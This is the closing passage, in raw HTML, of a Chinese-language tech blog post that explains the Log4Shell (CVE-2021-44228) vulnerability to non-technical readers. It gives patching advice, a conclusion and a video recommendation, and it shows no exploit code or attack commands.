停用或是升版，升級到不會被這個漏洞影響的版本，但有些時候第一時間的改版可能沒有把漏洞完全補掉，因此記得更新完以後還是要密切注意是否有更新的版本。例如說在這篇文章寫完後過沒多久，官方就釋出了第三個 patch 修復其他相關問題：<a href="https://thehackernews.com/2021/12/apache-issues-3rd-patch-to-fix-new-high.html" rel="noopener noreferrer" target="_blank">Apache Issues 3rd Patch to Fix New High-Severity Log4j Vulnerability</a></p><h2 id="%E7%B5%90%E8%AA%9E"><a href="#%E7%B5%90%E8%AA%9E" class="direct-link">#</a> 結語</h2><p>一個很多人用的套件，加上一個很常見的功能，再加上一個很簡單的攻擊方式以及嚴重的後果，就成了一個可以被載入史冊的漏洞。</p><p>文中有些比喻為了不要講得太細節，會是精簡過後的版本，不一定能完全涵蓋本來的漏洞，在轉換成故事比喻的過程中一定會有一些遺漏的部分，但對於整體的理解我覺得影響不大。</p><p>如果你想了解更技術的細節以及時間軸，很推薦這一支影片：<a href="https://www.youtube.com/watch?v=w2F67LbEtnk&t=16s&ab_channel=LiveOverflow" rel="noopener noreferrer" target="_blank">Hackers vs. Developers // CVE-2021-44228 Log4Shell</a>，裡面講得很清楚，也探討了開發者與資安從業人員的關係。</p><p>最後，希望這篇文章能讓不懂技術的大家更了解 log4shell 是怎樣的漏洞，以及這個漏洞為什麼如此嚴重。文中若有錯誤也請不吝留言指正，感謝。</p><div class="article-footer"><a href="https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/" on-click="share"><img alt="Share" src="/img/icons/icon_external link hyperlink.svg" height="24" width="24">Share this post</a></div><div><p style="font-weight: bold;">Tag</p><div class="post-tags"><a href="/tags/security/" class="post-tag">#Security</a></div><p style="font-weight: bold;">Recommendation</p><ol><li><a href="/posts/cymetrics/spring4shell-critical-java-rce-0day/">Spring4shell 來襲！繼 Log4Shell 後又一 Java 生態系嚴重漏洞出現</a></li><li><a href="/posts/huli/wordpress-plugin-amelia-sensitive-information-disclosure/">WordPress Plugin Amelia &lt; 1.0.49 敏感資訊洩露漏洞細節</a></li><li><a href="/posts/crystal/email-sec-extra/">關於 email security 的大小事 — 延伸篇</a></li><li><a href="/posts/huli/xss-attack-and-defense/">淺談 XSS 攻擊與防禦的各個環節</a></li><li><a href="/posts/huli/prevent-xss-might-be-harder-than-you-thought/">防止 XSS 可能比想像中困難</a></li></ol></div><div class="article-author"><img alt="huli" src="/img/authors/huli_logo.jpg" class="article-author__img" data-deopt="true"><div class="article-author__info"><div class="article-author__title">Author</div><div class="article-author__author"><a href="/posts/huli">huli</a></div><div class="article-author__intro">Act as a bridge between Front-end and Security world</div></div></div><p style="font-weight: bold;">Discussion(login required)</p><script async="" src="https://utteranc.es/client.js" crossorigin="anonymous" id="utterance-script" issue-term="title" label="utterance" repo="cymetrics/blog" theme="github-light"></script><script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"從監視攝影機理解 Log4j 跟 Log4Shell 漏洞","image":["https://tech-blog.cymetrics.io/img/posts/huli/what-is-log4j-and-log4shell/cover-1920w.jpg","https://tech-blog.cymetrics.io/img/posts/huli/what-is-log4j-and-log4shell/command-1920w.png","https://tech-blog.cymetrics.io/img/posts/huli/what-is-log4j-and-log4shell/attack-1920w.jpg","https://tech-blog.cymetrics.io/img/icons/icon_external link hyperlink.svg","https://tech-blog.cymetrics.io/img/authors/huli_logo.jpg"],"author":{"@type":"Person","name":"huli"},"publisher":{"@type":"Organization","name":"Cymetrics Tech Blog","url":"https://tech-blog.cymetrics.io","logo":{"@type":"ImageObject","url":"https://tech-blog.cymetrics.io/img/favicon/favicon-512x512.png","width":512,"height":512}},"url":"https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/","mainEntityOfPage":"https://tech-blog.cymetrics.io/posts/huli/what-is-log4j-and-log4shell/","datePublished":"2021-12-18","dateModified":"2023-04-10","description":"（圖片來自於 Joe Gadd on Unsplash） 2021 年末資安界最大的新聞莫過於 Log4j 的漏洞，編號為 CVE-2021-44228，又被稱為 Log4Shell，甚至被一些人形容為「核彈級漏洞」，可見這個漏洞的影響程度之深遠。..."}</script></article></main><footer><div class="footer-logos"><a href="https://www.facebook.com/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="facebook" src="/img/icons/icon_social media_facebook.svg" height="30" width="30"></a><a href="https://www.linkedin.com/company/cymetrics" rel="noopener noreferrer" target="_blank"><img alt="linkedin" src="/img/icons/icon_social media_linkedln.svg" height="30" width="30"></a><a href="https://tech-blog.cymetrics.io/feed/feed.xml" rel="noreferrer noopener" target="_blank"><img alt="rss feed" src="/img/icons/rss-feed.svg" height="30" width="30"></a></div><div class="copyright">© 2021 Cymetrics Tech Blog, based on <a href="https://github.com/google/eleventy-high-performance-blog" rel="noopener noreferrer" target="_blank">eleventy-high-performance-blog</a>. <a href="https://oneinfinity.global/" rel="noopener noreferrer" target="_blank">OneInfinity</a></div></footer><script>// light/dark theme switch
      // disable dark mode for now
      const menuBtn = document.querySelector('.menu__btn')
      menuBtn.addEventListener('click', function() {
        document.querySelector('body').classList.toggle('lock')
        menuBtn.classList.toggle('menu__btn--close');
        document.querySelector('.nav__links').classList.toggle('nav__links--open')
      })</script></body></html>